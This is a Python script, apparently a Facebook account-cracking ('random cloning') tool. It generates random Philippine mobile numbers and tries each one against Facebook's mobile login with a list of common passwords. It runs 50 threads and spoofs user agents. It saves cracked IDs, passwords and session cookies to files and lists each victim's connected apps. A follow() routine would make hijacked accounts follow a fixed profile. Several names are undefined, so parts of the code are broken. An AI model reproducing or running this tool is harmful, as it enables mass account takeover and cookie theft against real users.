# CODE BY ALEXANDER AXL MONTREAL
import os,sys,time,json,random,re,string,platform,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-----[Global Functions]-----#
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
#-----[Colours]-----#
W = '\x1b[1;37m'  # White
Y = '\x1b[1;33m'  # Yellow
B = '\x1b[1;34m'  # Blue
P = '\x1b[1;35m'  # Purple
G = '\x1b[1;32m'  # Green
R = '\x1b[1;31m'  # Red
C = '\x1b[1;36m'  # NOT
E = '\x1b[1;35m'  # NOT
RESET = '\x1b[0m'  # Reset
#-----[BIT]-----#
os.system('git pull --quiet 2>/dev/null')
bit = platform.architecture()[0]
if bit == '64bit':
 os.system('clear')
 print(f'{R}[{G}•{R}] {G} YOU ARE 64BIT USER')
 time.sleep(5)
elif bit == '32bit':
 os.system('clear')
 print(f'{R}[{G}•{R}] {G} YOU ARE 32BIT USER')
 time.sleep(5)

sys.stdout.write('\x1b]2;••••💚KAIDO💚••••\x07')

def linex():
	print(f'''{B}──────────────────────────────────────────────────────────────────────''')

def clear():
	os.system('clear')
	print(logo)
now = datetime.now()
dt_string = now.strftime("%H:%G")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, Y, G, W, B, R, C, E]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%G")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
mtd,cp_cpx,cokix=[],[],[]
ugen2=[]
ugen=[]
#-----[App Checker]-----#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[😍] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Added to"," Added to"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🥵] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Expired"," Expired"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
           
#-----[UserAgent]-----#
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
         
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
#-----[Logo]-----#
logo=(f"""{G}		db   dD  .d8b.  d888888b d8888b.  .d88b.\n  		88 ,8P' d8' `8b   `88'   88  `8D .8P  Y8.\n 		88,8P   88ooo88    88    88   88 88    88\n 		88`8b   88~~~88    88    88   88 88    88\n 		88 `88. 88   88   .88.   88  .8D `8b  d8'\n 		YP   YD YP   YP Y888888P Y8888D'  `Y88P\n{B}──────────────────────────────────────────────────────────────────────\n{R}[{G}•{R}] {G}AUTHOR    :   KAIDO\n{R}[{G}•{R}] {G}TOOLS     :   RANDOM CLONING PHILIPPINE\n{R}[{G}•{R}] {G}BROTHER   :   BRYAN\n{R}[{G}•{R}] {G}SYS       :   DATA/WIFI\n{R}[{G}•{R}] {G}DEVICE    :   {bit}\n{R}[{G}•{R}] {G}VERSION   :   PRIVATE\n{R}[{G}•{R}] {G}WORKING   :   ALL COUNTRY\n{B}──────────────────────────────────────────────────────────────────────{RESET}""")

try:
   print(f'\n\n{R}[{G}•{R}] {G}LOADING ASSET FILES ... \033[0;97m')
   v = PRIVATE
   update = ('PRIVATE')
   update = ('PRIVATE')
   if str(v) in update:
       os.system('clear')
   else:pass
except:print(f'\n{R}[{G}•{R}] {R}NO INTERNET CONNECTION ... \033[0;97m')

#-----[Loop Menu]-----#  
loop=0
oks=[]
cps=[]

#-----[Main-Menu]-----#
def random_menu():
    os.system('clear');print(logo)
    print(f'{R}[{G}1{R}] {G}RANDOM CLONING')
    print(f'{R}[{G}0{R}] {G}EXIT')
    linex()
    random=input(f'{R}[{G}•{R}] {G}CHOOSE : ')
    if random in['1','01']:kaidoo()
    elif random in['0','00']:exit()
    else:exit()
    
def kaidoo():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f'{R}[{G}•{R}] {G}PHILIPPINE CODE : +63923 | +63925 | +63928 | +63921 ')
    linex()
    code = input(f'{R}[{G}?{R}] {G}PUT CODE : ')
    os.system('clear')
    print(logo)
    print(f'{R}[{G}•{R}] {G}EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input(f'{R}[{G}•{R}] {G}PUT LIMIT : '))
    linex()
    xd_cp=input(f'{R}[{G}•{R}] {G}YOU WANT TO SHOW CP ACCOUNT?{R}[{G}Y/N{R}]{G}: ')
    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
    else:cp_cpx.append('n')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as AXL:
        clear()
        tl = str(len(user))
        print(f'{R}[{G}•{R}] {G}SIM CODE : '+code)
        print(f'{R}[{G}•{R}] {G}CRACK PROCESS HAS STARTED')
        print(f'{R}[{G}!{R}] {G}USE FLIGHT MODE FOR SPEED UP')
        linex()
        for fuck in user:
            pwx = [fuck,'magandaako','gandako','pogiako','pogiako123','gwapoako123','gwapoako','iloveyou','i love you','cuteko','cuteko123','cuteko143','mahal123','mahal143','iloveyou143','maganda123','maganda143','pogi123','pogi143']
            uid = code+fuck
            AXL.submit(kaidoox,uid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED')
    print('OK IDS SAVED IN /sdcard/KAIDO-RANDOM-OK.txt')
    print('CP IDS SAVED IN /sdcard/KAIDO-RANDOM-CP.txt')
    linex()
    
def kaidoox(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
    'method':'POST',
    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Redmi 5 Plus"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"8.1.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[INNOCENT-OK💚] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/KAIDO-RANDOM-OK.txt', 'a').write(cid+'|'+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[KAIDO-CP💔]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/KAIDO-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mKAIDO-RAN\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

#-----[Run Menu]-----#
random_menu()